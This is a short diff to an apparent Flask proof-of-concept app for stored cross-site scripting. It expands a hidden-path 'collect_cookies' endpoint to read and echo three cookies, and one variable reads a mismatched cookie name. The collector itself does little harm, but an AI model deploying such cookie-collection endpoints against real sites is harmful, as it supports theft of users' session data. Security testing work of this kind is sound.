@@ -15,5 +15,10 @@ def hello_poc_sxss():
 
 @app.route('/6w1ymvcfdrf33n7m2cc6')
 def collect_cookies():
-    CK = request.cookies.get('_ga')
-    return f"Cookies to collect: {CK}" 
+    _ga = request.cookies.get('_ga')
+    _git = request.cookies.get('_it')
+    _gat = request.cookies.get('_gat')
+    return f"Cookies to collect: \n\n" \
+    f"_ga = {_ga} \n\n" \
+    f"_git = {_git} \n\n" \
+    f"_gat = {_gat} \n\n"
